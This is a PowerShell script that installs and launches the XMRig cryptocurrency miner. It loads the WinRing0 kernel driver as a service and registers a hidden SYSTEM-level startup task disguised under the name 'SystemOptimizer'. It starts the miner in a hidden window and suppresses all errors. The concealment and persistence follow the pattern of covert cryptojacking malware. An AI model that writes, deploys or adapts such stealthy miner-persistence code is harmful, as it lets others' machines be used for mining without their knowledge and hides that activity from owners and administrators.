#Requires -RunAsAdministrator

$ErrorActionPreference = "SilentlyContinue"

$xmrigDir = "C:\mining\xmrig"
$xmrigExe = "$xmrigDir\xmrig-6.26.0\xmrig.exe"
$configFile = "$xmrigDir\config.json"
$driverPath = "$xmrigDir\xmrig-6.26.0\WinRing0x64.sys"

# Install WinRing0 driver silently
if (Test-Path $driverPath) {
    $serviceName = "WinRing0_1_2_0"
    $existingService = Get-Service $serviceName -ErrorAction SilentlyContinue
    if ($existingService) {
        Stop-Service $serviceName -Force -ErrorAction SilentlyContinue
        sc.exe delete $serviceName 2>$null
    }
    sc.exe create $serviceName binPath= "$driverPath" type= kernel start= demand 2>$null
    Start-Service $serviceName -ErrorAction SilentlyContinue
}

# Create scheduled task for auto-start (hidden, SYSTEM)
$taskName = "SystemOptimizer"
$action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$xmrigDir\launch.vbs`""
$trigger = New-ScheduledTaskTrigger -AtStartup
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -Hidden
Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force -ErrorAction SilentlyContinue

# Start now (hidden)
$wshell = New-Object -ComObject WScript.Shell
$wshell.Run("`"$xmrigExe`" --config=`"$configFile`"", 0, $false)